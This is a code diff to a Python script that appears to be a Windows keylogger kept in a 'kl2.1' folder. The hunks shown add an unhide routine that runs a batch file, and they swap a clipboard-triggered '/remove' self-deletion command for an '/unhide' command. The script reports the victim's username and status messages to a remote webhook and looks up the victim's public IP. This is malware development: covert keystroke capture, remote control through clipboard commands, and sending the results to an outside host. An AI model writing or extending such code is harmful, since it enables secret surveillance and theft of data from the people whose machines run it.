@@ -45,6 +45,15 @@ def run_bat_file():
     except subprocess.CalledProcessError as e:
         print(f"Error running {bat_file_path}: {e}")
 
+def unhide():
+    """Run the kill.bat file when the script starts."""
+    bat_file_path = rf"C:\users\{username}\kl2.1\unhide.bat"  # Update the path to your kill.bat file
+    try:
+        subprocess.run([bat_file_path], check=True)
+        print(f"Successfully ran {bat_file_path}")
+    except subprocess.CalledProcessError as e:
+        print(f"Error running {bat_file_path}: {e}")
+
 
 def get_public_ip():
     """Fetch the public IP address using an external API."""
@@ -113,14 +122,12 @@ def on_release(key):
             send_to_webhook("Launching again on restart.")
             return False
 
-        elif "/remove" in current_clipboard:
-            send_to_webhook(f"Removed by: {username}")
-            file_path = rf"C:\users\{username}\kl2.1"
+        elif "/unhide" in current_clipboard:
             try:
-                os.rmdir(file_path)
-                send_to_webhook(f"Directory removed: {file_path}")
-            except OSError as e:
-                send_to_webhook(f"Error removing directory: {e}")
+                unhide()
+                send_to_webhook("Folder visable process stopped.")
+            except:
+                send_to_webhook("Faild to make folder visable.")
             return False
 
     except Exception as e:
